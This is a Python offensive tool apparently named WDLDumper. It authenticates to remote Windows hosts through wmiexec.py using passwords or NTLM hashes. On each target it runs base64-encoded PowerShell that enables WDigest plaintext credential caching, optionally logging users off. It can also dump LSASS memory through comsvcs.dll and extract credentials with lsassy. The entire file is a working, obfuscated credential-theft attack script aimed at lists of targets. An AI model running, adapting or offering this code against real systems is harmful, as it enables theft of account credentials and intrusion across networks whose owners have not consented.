import argparse
import sys
import re
import subprocess
import time

banner = """

8   8  8 8""""8 8     8""""8                                 
8   8  8 8    8 8     8    8 e   e eeeeeee eeeee eeee eeeee  
8e  8  8 8e   8 8e    8e   8 8   8 8  8  8 8   8 8    8   8  
88  8  8 88   8 88    88   8 8e  8 8e 8  8 8eee8 8eee 8eee8e 
88  8  8 88   8 88    88   8 88  8 88 8  8 88    88   88   8 
88ee8ee8 88eee8 88eee 88eee8 88ee8 88 8  8 88    88ee 88   8 

by @theBlazz3
"""

if __name__ == "__main__":
    
    print(banner)
    
    usage = """
    
    python3 wdldumper.py -m [wdigest/dump] -d [domain/workgroup] -u [admin] -p [password/LMHASH:NTHASH] -t [IP/targets.txt]
    
    examples:
    
        python3 wdldumper.py -m wdigest -d evil.corp -u Administrator -p Supers3cret123 -t 192.168.1.12
        python3 wdldumper.py -m dump -d mydomain.com -u Administrator -p aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 -t targets.txt
    
    """
    
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-m", "--mode", help="wdigest or dump (enable wdigest or perform an lsass dump on target)")
    parser.add_argument("-d", "--domn", help="domain/workgroup to authenticate in")
    parser.add_argument("-u", "--user", help="username to authenticate as")
    parser.add_argument("-p", "--pasw", help="password or hash to authenticate with, leave blank for prompt")
    parser.add_argument("-t", "--targ", help="target ip or list of targets")
    args = parser.parse_args()
    
    if len(sys.argv[1:])==0:
        parser.print_help()
        sys.exit()
    if not args.mode:
        print("Specify a MODE!\n")
        parser.print_help()
        sys.exit()
    if not (args.mode == "wdigest" or args.mode == "dump"):
        print("Only allowed MODES: wdigest or dump\n")
        parser.print_help()
        sys.exit()
    if not args.domn:
        print("Specify a DOMAIN\n")
        parser.print_help()
        sys.exit()
    if not args.user:
        print("Specify a USER\n")
        parser.print_help()
        sys.exit()
    if not args.pasw:
        print("Specify a PASSWORD\n")
        parser.print_help()
        sys.exit()
    if not args.targ:
        print("Specify a TARGET(S)\n")
        parser.print_help()
        sys.exit()
        
    if args.mode == "wdigest":
        
        #ps_command_enable_wdigest = Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"
        ps_command_enable_wdigest = "\"powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiAA==\""
        
        #ps_command_enable_wdigest_logout = Invoke-Expression -Command "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1"; $a = ((quser) -replace '^>', '') -replace '\s{2,}', ',' | ConvertFrom-Csv; logoff $a.id
        ps_command_enable_wdigest_logout = "\"powershell.exe -exec bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAIgByAGUAZwAgAGEAZABkACAASABLAEwATQBcAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB2AGkAZABlAHIAcwBcAFcARABpAGcAZQBzAHQAIAAvAHYAIABVAHMAZQBMAG8AZwBvAG4AQwByAGUAZABlAG4AdABpAGEAbAAgAC8AdAAgAFIARQBHAF8ARABXAE8AUgBEACAALwBkACAAMQAiADsAIAAkAGEAIAA9ACAAKAAoAHEAdQBzAGUAcgApACAALQByAGUAcABsAGEAYwBlACAAJwBeAD4AJwAsACAAJwAnACkAIAAtAHIAZQBwAGwAYQBjAGUAIAAnAFwAcwB7ADIALAB9ACcALAAgACcALAAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEMAcwB2ADsAIABsAG8AZwBvAGYAZgAgACQAYQAuAGkAZAA=\""
                    
        yes = set(['yes', 'y', 'Yes', 'Y'])
        no = set(['no', 'n', 'No', 'N'])

        answer = input("Do you want to log out the system after enabling WDigest? (y/n)\n")        
        
        if answer in yes:
            if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", args.targ)):
                if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                    wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, args.targ)
                else:
                    wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
                command = wmi_command + ps_command_enable_wdigest_logout
                command_output = subprocess.check_output(command, shell=True)
                command_output = command_output.decode("utf-8")
                if "Completed" in command_output:
                    print("Wdigest enabled on {}!".format(args.targ))
                else:
                    print("Error enabling wdigest! Try again.")
                    sys.exit()
            else:
                f = open(args.targ, 'r').read().split('\n')
                for ip in f:
                    if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)):
                        if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                            wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, ip)
                        else:
                            wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
                        command = wmi_command + ps_command_enable_wdigest_logout
                        command_output = subprocess.check_output(command, shell=True)
                        command_output = command_output.decode("utf-8")
                        if "Completed" in command_output:
                            print("Wdigest enabled on {}!".format(ip))
                        else:
                            print("Error enabling wdigest! Try again.")
                            sys.exit()
                    else:
                        print("Specify a valid ip address list\n")
                        parser.print_help()
                        sys.exit()
        elif answer in no:
            if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", args.targ)):
                if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                    wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, args.targ)
                else:
                    wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
                command = wmi_command + ps_command_enable_wdigest
                command_output = subprocess.check_output(command, shell=True)
                command_output = command_output.decode("utf-8")
                if "Completed" in command_output:
                    print("Wdigest enabled on {}!".format(args.targ))
                else:
                    print("Error enabling wdigest! Try again.")
                    sys.exit()
            else:
                f = open(args.targ, 'r').read().split('\n')
                for ip in f:
                    if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)):
                        if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                            wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, ip)
                        else:
                            wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
                        command = wmi_command + ps_command_enable_wdigest
                        command_output = subprocess.check_output(command, shell=True)
                        command_output = command_output.decode("utf-8")
                        if "Completed" in command_output:
                            print("Wdigest enabled on {}!".format(ip))
                        else:
                            print("Error enabling wdigest! Try again.")
                            sys.exit()
                    else:
                        print("Specify a valid ip address list\n")
                        parser.print_help()
                        sys.exit()
        else:
            print("Invalid option, try again.")
            sys.exit()

    elif args.mode == "dump":
        
        #powershell -c "rundll32 comsvcs.dll, MiniDump (get-process lsass).id C:\Windows\Temp\dump.bin full"
        ps_command_dump = "\"powershell.exe -exec bypass -enc cgB1AG4AZABsAGwAMwAyACAAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAGcAZQB0AC0AcAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwApAC4AaQBkACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABkAHUAbQBwAC4AYgBpAG4AIABmAHUAbABsAA==\""
        
        if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", args.targ)):
            if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, args.targ)
            else:
                wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, args.targ)
            command1 = wmi_command + ps_command_dump
            if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, args.targ)
            else:
                command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, args.targ)
            try:
                command_output = subprocess.check_output(command1, shell=True)
                command_output = command_output.decode("utf-8")
                if "Completed" in command_output:
                    print("Dump executed on {}...".format(args.targ))
                else:
                    print("Error dumping on {}, try again.".format(args.targ))
                    sys.exit()
                command_output = subprocess.check_output(command2, shell=True)
                command_output = command_output.decode("utf-8")
                if "[+]" in command_output:
                    print("Pwned!")
                    print(command_output)
                else:
                    print("Nothing to show on lsassy...")
            except subprocess.CalledProcessError as e:
                if "invalid" in e.output.decode("utf-8"):
                    print("Invalid credentials on {}!".format(args.targ))
        else:
            f = open(args.targ, 'r').read().split('\n')
            for ip in f:
                if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip)):
                    if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                        wmi_command = 'wmiexec.py -hashes {} {}/{}@{} '.format(args.pasw, args.domn, args.user, ip)
                    else:
                        wmi_command = 'wmiexec.py {}/{}:{}@{} '.format(args.domn, args.user, args.pasw, ip)
                    command1 = wmi_command + ps_command_dump
                    if (re.match(r"^[0-9A-Fa-f]{32}\:[0-9A-Fa-f]{32}$", args.pasw)):
                        command2 = 'lsassy --hashes {} {}/{}@{}:/C$/Windows/Temp/dump.bin'.format(args.pasw, args.domn, args.user, ip)
                    else:
                        command2 = 'lsassy {}/{}:{}@{}:/C$/Windows/Temp/dump.bin'.format(args.domn, args.user, args.pasw, ip)
                    command_output = subprocess.check_output(command1, shell=True)
                    command_output = command_output.decode("utf-8")
                    if "Completed" in command_output:
                        print("Dump executed on {}".format(ip))
                    else:
                        print("Error dumping on {}, try again.".format(ip))
                    command_output = subprocess.check_output(command2, shell=True)
                    command_output = command_output.decode("utf-8")
                    if "[+]" in command_output:
                        print("Pwned!")
                        print(command_output)
                    else:
                        print("Nothing to show on lsassy...")